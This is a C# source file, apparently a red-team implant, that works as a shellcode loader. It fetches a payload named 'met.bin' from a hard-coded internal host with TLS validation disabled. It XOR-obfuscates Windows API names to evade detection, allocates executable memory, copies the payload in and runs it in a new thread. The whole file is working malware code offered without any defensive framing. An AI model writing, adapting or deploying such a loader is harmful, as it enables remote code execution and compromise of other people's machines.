using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Reflection.Emit;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using static ImplantCSharp.Win32;

namespace ImplantCSharp
{
    internal class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void WindowsRun();
        static async Task Main(string[] args)
        {
            byte[] material;
            
            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    material = await client.GetByteArrayAsync("http://10.10.10.7/met.bin");
                }
            }

            byte[] vA = { 0x3d, 0x1c, 0x1c, 0x17, 0x1c, 0x19, 0x3, 0x33, 0x7, 0x19, 0x1, 0x0 };
            byte[] cRT = { 0x28, 0x7, 0xb, 0x2, 0x1d, 0x1d, 0x3b, 0x1a, 0x19, 0x10, 0xf, 0x7 };
            byte[] wFS = { 0x3c, 0x14, 0x7, 0x17, 0x2f, 0x17, 0x1d, 0x21, 0x2, 0x1b, 0x9, 0xf, 0xc, 0x37, 0xd, 0x18, 0xe, 0x16, 0x1a };
            //byte[] vP = { 0x3d, 0x1c, 0x1c, 0x17, 0x1c, 0x19, 0x3, 0x22, 0x19, 0x1a, 0x1a, 0x6, 0xa, 0xc };

            string virtualalloc = eksor(vA);
            string createthread = eksor(cRT);
            string waitforsingleobject = eksor(wFS);
            //string virtualprotect = eksor(vP);

            IntPtr pVirtualAlloc = Win32.GetProcAddress(Win32.GetModuleHandle("kernel32.dll"), virtualalloc);
            IntPtr pWaitForSingleObject = Win32.GetProcAddress(Win32.GetModuleHandle("kernel32.dll"), waitforsingleobject);
            IntPtr pCreateThread = Win32.GetProcAddress(Win32.GetModuleHandle("kernel32.dll"), createthread);
            //IntPtr pVirtualProtect = Win32.GetProcAddress(Win32.GetModuleHandle("kernel32.dll"), virtualprotect);

            VirtualAlloc fVA = (VirtualAlloc)Marshal.GetDelegateForFunctionPointer(pVirtualAlloc, typeof(VirtualAlloc));
            WaitForSingleObject fWFS = (WaitForSingleObject)Marshal.GetDelegateForFunctionPointer(pWaitForSingleObject, typeof(WaitForSingleObject));
            CreateThread fcRT = (CreateThread)Marshal.GetDelegateForFunctionPointer(pCreateThread, typeof(CreateThread));
            //VirtualProtect fVP = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));

            var baseAddress = fVA(IntPtr.Zero, (uint)material.Length, Win32.AllocationType.Commit | Win32.AllocationType.Reserve, Win32.MemoryProtection.ExecuteReadWrite);
            Marshal.Copy(material, 0, baseAddress, material.Length);
            //fVP(baseAddress, (uint)material.Length, 0x20, out _);
            //WindowsRun r = (WindowsRun)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(WindowsRun));
            //r();
            var hThread = fcRT(IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, IntPtr.Zero);
            fWFS(hThread, 0xFFFFFFFF);
        }

        static string eksor(byte[] encryptName)
        {
            int j = 0;
            string kunci = "kuncixor";
            int kuncilength = kunci.Length;
            byte[] decryptName = new byte[encryptName.Length];
            for(int i=0; i<encryptName.Length; i++)
            {
                decryptName[i] = (byte)((uint)encryptName[i] ^ (uint)kunci[i%kuncilength]);
            }
            return Encoding.ASCII.GetString(decryptName);
        }
    }
}
